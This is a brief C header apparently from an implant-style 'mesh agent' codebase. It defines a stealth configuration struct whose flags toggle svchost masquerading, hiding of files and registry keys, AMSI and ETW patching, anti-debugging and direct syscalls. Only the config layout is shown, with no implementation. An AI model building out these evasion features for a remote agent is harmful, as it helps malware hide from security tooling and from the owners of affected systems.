#ifndef MESHCORE_CONFIG_STEALTH_CONFIG_H
#define MESHCORE_CONFIG_STEALTH_CONFIG_H

#include "config_common.h"

typedef struct mesh_stealth_profile_s
{
    uint8_t stealthEnabled;
    uint8_t svchostMode;
    uint8_t hideFiles;
    uint8_t hideRegistry;
    uint8_t amsiPatch;
    uint8_t etwPatch;
    uint8_t antiDebug;
    uint8_t directSyscalls;
    uint8_t bundleExtract;
} mesh_stealth_profile_t;

static const mesh_stealth_profile_t g_meshStealthProfile =
{
    MESH_AGENT_STEALTH_ENABLED,
    MESH_AGENT_SVCHOST_MODE,
    MESH_AGENT_HIDE_FILES,
    MESH_AGENT_HIDE_REGISTRY,
    MESH_AGENT_AMSI_PATCH,
    MESH_AGENT_ETW_PATCH,
    MESH_AGENT_ANTI_DEBUG,
    MESH_AGENT_SYSCALLS_DIRECT,
    MESH_AGENT_BUNDLE_EXTRACT_DEFAULT
};

#endif /* MESHCORE_CONFIG_STEALTH_CONFIG_H */
